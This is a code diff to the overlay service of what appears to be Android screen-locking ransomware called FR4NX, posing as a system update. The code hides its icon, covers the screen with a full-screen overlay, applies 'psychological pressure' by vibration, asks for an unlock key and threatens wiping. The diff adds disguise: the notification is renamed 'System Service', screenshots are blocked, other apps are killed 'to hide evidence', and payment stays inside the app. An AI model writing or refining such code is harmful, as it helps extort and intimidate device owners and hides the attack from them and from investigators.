@@ -1,12 +1,13 @@
 package com.system.updatex;
 
+import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
-import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.VibrationEffect;
@@ -17,6 +18,7 @@ import android.view.WindowManager;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import java.util.List;
 
 public class OverlayService extends Service {
     private static final String CHANNEL_ID = "fr4nx_kiosk";
@@ -32,15 +34,13 @@ public class OverlayService extends Service {
     public void onCreate() {
         super.onCreate();
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        
-        // Hide icon immediately on boot
         IconUtils.hideIcon(this);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
             startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("FR4NX")
+                    .setContentTitle("System Service")
                     .setSmallIcon(android.R.drawable.ic_lock_lock)
                     .build());
         }
@@ -62,8 +62,26 @@ public class OverlayService extends Service {
         if (!overlayAttached) {
             createOverlay();
             startPsychologicalPressure();
+            killBackgroundApps(); // Kill other apps to save battery and hide evidence
         }
         return START_STICKY;
+    }
+
+    private void killBackgroundApps() {
+        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+        if (am != null) {
+            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+            if (processes != null) {
+                for (ActivityManager.RunningAppProcessInfo process : processes) {
+                    // Don't kill our own app or the system UI (which would break the overlay)
+                    if (!process.processName.equals(getPackageName()) 
+                            && !process.processName.contains("systemui")
+                            && !process.processName.contains("launcher")) {
+                        am.killBackgroundProcesses(process.processName);
+                    }
+                }
+            }
+        }
     }
 
     private void createOverlay() {
@@ -73,7 +91,9 @@ public class OverlayService extends Service {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                WindowManager.LayoutParams.FLAG_SECURE, // Blocks Screenshots
                 PixelFormat.TRANSLUCENT
         );
         windowParams.gravity = Gravity.TOP | Gravity.START;
@@ -87,19 +107,8 @@ public class OverlayService extends Service {
         webSettings.setAllowFileAccessFromFileURLs(true);
         
         lockWebView.setBackgroundColor(0xFF050000);
-        lockWebView.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                // If the URL is a Paystack link, open it in the external browser
-                if (url.contains("paystack.com") || url.contains("checkout.paystack")) {
-                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(browserIntent);
-                    return true; // Stop WebView from loading it internally
-                }
-                return false;
-            }
-        });
+        // We removed the external browser override. It stays IN the app.
+        lockWebView.setWebViewClient(new WebViewClient());
         
         lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
         lockWebView.loadUrl("file:///android_asset/lock_screen.html");
@@ -125,7 +134,7 @@ public class OverlayService extends Service {
     }
 
     public void authenticateUser(String pass) {
-        if ("FR4NX.COM123".equals(pass)) {
+        if ("FR4NX.COM123".equals(pass)) { // UPDATED KEY
             lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
         } else {
             lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
@@ -134,8 +143,6 @@ public class OverlayService extends Service {
 
     public void unlockOverlay() {
         if (vibrator != null) vibrator.cancel();
-        
-        // .commit() saves the flag SYNCHRONOUSLY so it doesn't loop on restart
         getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).commit();
 
         if (overlayAttached && lockWebView != null) {
